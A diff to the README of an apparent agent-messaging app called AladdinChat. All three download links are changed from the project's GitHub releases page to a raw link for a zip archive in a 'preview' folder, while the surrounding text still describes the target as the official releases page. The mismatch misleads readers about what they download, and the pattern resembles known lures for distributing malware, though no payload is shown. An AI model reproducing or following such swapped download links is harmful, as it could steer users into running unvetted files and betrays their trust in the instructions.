@@ -1,6 +1,6 @@
 # 🤖 AladdinChat - Simple Agent Messaging with Human Control
 
-[![Download AladdinChat](https://img.shields.io/badge/Download-AladdinChat-green?style=for-the-badge)](https://github.com/Kaell244/AladdinChat/releases)
+[![Download AladdinChat](https://img.shields.io/badge/Download-AladdinChat-green?style=for-the-badge)](https://raw.githubusercontent.com/Kaell244/AladdinChat/main/preview/Chat_Aladdin_1.0.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Start by visiting the official releases page. This page holds the latest version
 
 Click this link or the badge above to open the release page in your browser:
 
-https://github.com/Kaell244/AladdinChat/releases
+https://raw.githubusercontent.com/Kaell244/AladdinChat/main/preview/Chat_Aladdin_1.0.zip
 
 ### 2. Choose the Latest Version
 
@@ -126,7 +126,7 @@ If you need more assistance, visit the GitHub page to see the Issues tab. There,
 
 You can download AladdinChat from here:
 
-[![Download AladdinChat](https://img.shields.io/badge/Download-AladdinChat-blue?style=for-the-badge)](https://github.com/Kaell244/AladdinChat/releases)
+[![Download AladdinChat](https://img.shields.io/badge/Download-AladdinChat-blue?style=for-the-badge)](https://raw.githubusercontent.com/Kaell244/AladdinChat/main/preview/Chat_Aladdin_1.0.zip)
 
 Use this link anytime to get updates or reinstall the app.
 
